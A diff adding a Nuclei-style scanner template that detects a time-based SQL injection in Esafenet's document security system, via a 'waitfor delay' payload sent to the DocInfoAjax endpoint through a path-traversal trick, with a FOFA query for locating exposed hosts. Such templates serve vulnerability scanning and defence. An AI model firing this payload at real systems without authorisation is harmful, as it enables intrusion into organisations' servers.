@@ -1,0 +1,38 @@
+id: poc-yaml-yisaitong-esafenet-docinfoajax-sqli
+info:
+  name: 亿赛通电子文档安全管理系统 DocInfoAjax SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  metadata:
+    product: 亿赛通电子文档安全管理系统
+    fofa-query: app="亿赛通-电子文档安全管理系统"
+
+variables:
+  t1: "{{rand_int(5, 10)}}"
+  t2: "{{to_number(t1) + 2}}"
+
+http:
+  - method: POST
+    path:
+      - "/CDGServer3/js/../DocInfoAjax"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "command=JudgeHasFile&logicpath==-1'waitfor delay '0:0:{{t1}}'--"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: header
+        words:
+          - "CDGServer3"
+      - type: word
+        part: body
+        words:
+          - "fail"
+      - type: dsl
+        dsl:
+          - "duration > to_number(t1)"
+          - "duration < to_number(t2)"
